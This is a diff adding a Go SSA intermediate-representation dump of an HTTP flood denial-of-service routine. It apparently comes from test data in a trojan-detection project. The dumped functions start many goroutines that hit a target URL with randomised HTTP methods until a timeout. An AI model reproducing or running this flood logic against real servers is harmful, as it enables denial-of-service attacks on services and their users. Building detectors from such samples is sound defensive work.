@@ -1,0 +1,228 @@
+# Name: command-line-arguments.init
+# Package: command-line-arguments
+# Synthetic: package initializer
+func init():
+0:                                                                entry P:0 S:2
+	t0 = *init$guard                                                   bool
+	if t0 goto 2 else 1
+1:                                                           init.start P:1 S:1
+	*init$guard = true:bool
+	t1 = bytes.init()                                                    ()
+	t2 = context.init()                                                  ()
+	t3 = fmt.init()                                                      ()
+	t4 = math/rand.init()                                                ()
+	t5 = net/http.init()                                                 ()
+	t6 = net/url.init()                                                  ()
+	t7 = sync.init()                                                     ()
+	t8 = time.init()                                                     ()
+	jump 2
+2:                                                            init.done P:2 S:0
+	return
+
+# Name: command-line-arguments.fetchURL
+# Package: command-line-arguments
+# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\DOS\httpflood\httpflood.go:17:6
+func fetchURL(count int, ctx context.Context):
+0:                                                                entry P:0 S:1
+	t0 = new [1]any (varargs)                                       *[1]any
+	t1 = &t0[0:int]                                                    *any
+	t2 = make any <- int (count)                                        any
+	*t1 = t2
+	t3 = slice t0[:]                                                  []any
+	t4 = fmt.Printf("URL fetcher #%d h...":string, t3...) (n int, err error)
+	jump 1
+1:                                                             for.body P:2 S:2
+	t5 = invoke ctx.Done()                                  <-chan struct{}
+	t6 = select nonblocking [<-t5]           (index int, ok bool, struct{})
+	t7 = extract t6 #0                                                  int
+	t8 = t7 == 0:int                                                   bool
+	if t8 goto 2 else 3
+2:                                                          select.body P:1 S:0
+	t9 = new [1]any (varargs)                                       *[1]any
+	t10 = &t9[0:int]                                                   *any
+	t11 = make any <- int (count)                                       any
+	*t10 = t11
+	t12 = slice t9[:]                                                 []any
+	t13 = fmt.Printf("URL fetcher #%d h...":string, t12...) (n int, err error)
+	return
+3:                                                          select.next P:1 S:2
+	t14 = *data                                                 chan string
+	t15 = <-t14                                                      string
+	t16 = new net/http.Client (complit)                    *net/http.Client
+	t17 = math/rand.Intn(7:int)                                         int
+	t18 = t17 == 0:int                                                 bool
+	if t18 goto 5 else 7
+4:                                                          switch.done P:7 S:2
+	t19 = phi [5: t23, 6: t29, 8: t36, 10: t43, 12: t50, 14: t57, 16: t61] #req *net/http.Request
+	t20 = phi [5: t24, 6: t30, 8: t37, 10: t44, 12: t51, 14: t58, 16: t62] #err error
+	t21 = t20 != nil:error                                             bool
+	if t21 goto 17 else 18
+5:                                                          switch.body P:1 S:1
+	t22 = net/http.NewRequest("HEAD":string, t15, nil:io.Reader) (*net/http.Request, error)
+	t23 = extract t22 #0                                  *net/http.Request
+	t24 = extract t22 #1                                              error
+	jump 4
+6:                                                          switch.body P:1 S:1
+	t25 = convert []byte <- string ("{\"why\":\"I do not ...":string) []byte
+	t26 = bytes.NewBuffer(t25)                                *bytes.Buffer
+	t27 = make io.Reader <- *bytes.Buffer (t26)                   io.Reader
+	t28 = net/http.NewRequest("POST":string, t15, t27) (*net/http.Request, error)
+	t29 = extract t28 #0                                  *net/http.Request
+	t30 = extract t28 #1                                              error
+	jump 4
+7:                                                          switch.next P:1 S:2
+	t31 = t17 == 1:int                                                 bool
+	if t31 goto 6 else 9
+8:                                                          switch.body P:1 S:1
+	t32 = convert []byte <- string ("{\"why\":\"Ooh! Ooh!...":string) []byte
+	t33 = bytes.NewBuffer(t32)                                *bytes.Buffer
+	t34 = make io.Reader <- *bytes.Buffer (t33)                   io.Reader
+	t35 = net/http.NewRequest("PUT":string, t15, t34) (*net/http.Request, error)
+	t36 = extract t35 #0                                  *net/http.Request
+	t37 = extract t35 #1                                              error
+	jump 4
+9:                                                          switch.next P:1 S:2
+	t38 = t17 == 2:int                                                 bool
+	if t38 goto 8 else 11
+10:                                                         switch.body P:1 S:1
+	t39 = convert []byte <- string ("{\"why\":\"Ah damn, ...":string) []byte
+	t40 = bytes.NewBuffer(t39)                                *bytes.Buffer
+	t41 = make io.Reader <- *bytes.Buffer (t40)                   io.Reader
+	t42 = net/http.NewRequest("PATCH":string, t15, t41) (*net/http.Request, error)
+	t43 = extract t42 #0                                  *net/http.Request
+	t44 = extract t42 #1                                              error
+	jump 4
+11:                                                         switch.next P:1 S:2
+	t45 = t17 == 3:int                                                 bool
+	if t45 goto 10 else 13
+12:                                                         switch.body P:1 S:1
+	t46 = convert []byte <- string ("{\"why\":\"Really. I...":string) []byte
+	t47 = bytes.NewBuffer(t46)                                *bytes.Buffer
+	t48 = make io.Reader <- *bytes.Buffer (t47)                   io.Reader
+	t49 = net/http.NewRequest("HELP":string, t15, t48) (*net/http.Request, error)
+	t50 = extract t49 #0                                  *net/http.Request
+	t51 = extract t49 #1                                              error
+	jump 4
+13:                                                         switch.next P:1 S:2
+	t52 = t17 == 4:int                                                 bool
+	if t52 goto 12 else 15
+14:                                                         switch.body P:1 S:1
+	t53 = convert []byte <- string ("{\"why\":\"Now I rem...":string) []byte
+	t54 = bytes.NewBuffer(t53)                                *bytes.Buffer
+	t55 = make io.Reader <- *bytes.Buffer (t54)                   io.Reader
+	t56 = net/http.NewRequest("MATTIAS":string, t15, t55) (*net/http.Request, error)
+	t57 = extract t56 #0                                  *net/http.Request
+	t58 = extract t56 #1                                              error
+	jump 4
+15:                                                         switch.next P:1 S:2
+	t59 = t17 == 5:int                                                 bool
+	if t59 goto 14 else 16
+16:                                                         switch.next P:1 S:1
+	t60 = net/http.NewRequest("GET":string, t15, nil:io.Reader) (*net/http.Request, error)
+	t61 = extract t60 #0                                  *net/http.Request
+	t62 = extract t60 #1                                              error
+	jump 4
+17:                                                             if.then P:1 S:1
+	t63 = new [1]any (varargs)                                      *[1]any
+	t64 = &t63[0:int]                                                  *any
+	t65 = change interface any <- error (t20)                           any
+	*t64 = t65
+	t66 = slice t63[:]                                                []any
+	t67 = fmt.Println(t66...)                            (n int, err error)
+	jump 18
+18:                                                             if.done P:2 S:1
+	t68 = (*net/http.Client).Do(t16, t19)       (*net/http.Response, error)
+	t69 = new [2]any (varargs)                                      *[2]any
+	t70 = &t69[0:int]                                                  *any
+	t71 = make any <- int (count)                                       any
+	*t70 = t71
+	t72 = &t69[1:int]                                                  *any
+	t73 = make any <- string (t15)                                      any
+	*t72 = t73
+	t74 = slice t69[:]                                                []any
+	t75 = fmt.Printf("#%d: fetched %s \n":string, t74...) (n int, err error)
+	jump 1
+
+# Name: command-line-arguments.FloodUrl$1
+# Package: command-line-arguments
+# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\DOS\httpflood\httpflood.go:89:5
+# Parent: FloodUrl
+# Free variables:
+#   0:	workersN *int64
+#   1:	target *string
+func FloodUrl$1(ctx context.Context):
+0:                                                                entry P:0 S:1
+	jump 1
+1:                                                             for.loop P:2 S:2
+	t0 = phi [0: 1:int64, 5: t12] #i                                  int64
+	t1 = *workersN                                                    int64
+	t2 = t1 + 1:int64                                                 int64
+	t3 = t0 < t2                                                       bool
+	if t3 goto 2 else 3
+2:                                                             for.body P:1 S:2
+	t4 = invoke ctx.Done()                                  <-chan struct{}
+	t5 = select nonblocking [<-t4]           (index int, ok bool, struct{})
+	t6 = extract t5 #0                                                  int
+	t7 = t6 == 0:int                                                   bool
+	if t7 goto 4 else 5
+3:                                                             for.done P:1 S:0
+	return
+4:                                                          select.body P:1 S:0
+	return
+5:                                                          select.next P:1 S:1
+	t8 = (*sync.WaitGroup).Add(waitGroup, 1:int)                         ()
+	t9 = convert int <- int64 (t0)                                      int
+	go fetchURL(t9, ctx)
+	t10 = *data                                                 chan string
+	t11 = *target                                                    string
+	send t10 <- t11
+	t12 = t0 + 1:int64                                                int64
+	jump 1
+
+# Name: command-line-arguments.FloodUrl
+# Package: command-line-arguments
+# Location: E:\Trojan Detector\Trojan-Detector\src\Golang\test\Client\lib\DOS\httpflood\httpflood.go:74:6
+# Recover: 1
+# Locals:
+#   0:	t2 error
+func FloodUrl(target string, timeout time.Duration, workersN int64) error:
+0:                                                                entry P:0 S:2
+	t0 = new string (target)                                        *string
+	*t0 = target
+	t1 = new int64 (workersN)                                        *int64
+	*t1 = workersN
+	t2 = local error ()                                              *error
+	t3 = time.Now()                                               time.Time
+	t4 = (time.Time).Unix(t3)                                         int64
+	t5 = math/rand.Seed(t4)                                              ()
+	t6 = context.Background()                               context.Context
+	t7 = context.WithTimeout(t6, timeout) (context.Context, context.CancelFunc)
+	t8 = extract t7 #0                                      context.Context
+	t9 = extract t7 #1                                   context.CancelFunc
+	defer t9()
+	t10 = *t0                                                        string
+	t11 = net/url.ParseRequestURI(t10)                (*net/url.URL, error)
+	t12 = extract t11 #0                                       *net/url.URL
+	t13 = extract t11 #1                                              error
+	t14 = t13 != nil:error                                             bool
+	if t14 goto 2 else 3
+1:                                                              recover P:0 S:0
+	t15 = *t2                                                         error
+	return t15
+2:                                                              if.then P:1 S:0
+	*t2 = t13
+	rundefers
+	t16 = *t2                                                         error
+	return t16
+3:                                                              if.done P:1 S:0
+	t17 = make chan string 0:int                                chan string
+	*data = t17
+	t18 = make closure FloodUrl$1 [t1, t0]        func(ctx context.Context)
+	go t18(t8)
+	t19 = time.After(timeout)                              <-chan time.Time
+	t20 = <-t19                                                   time.Time
+	*t2 = nil:error
+	rundefers
+	t21 = *t2                                                         error
+	return t21
+
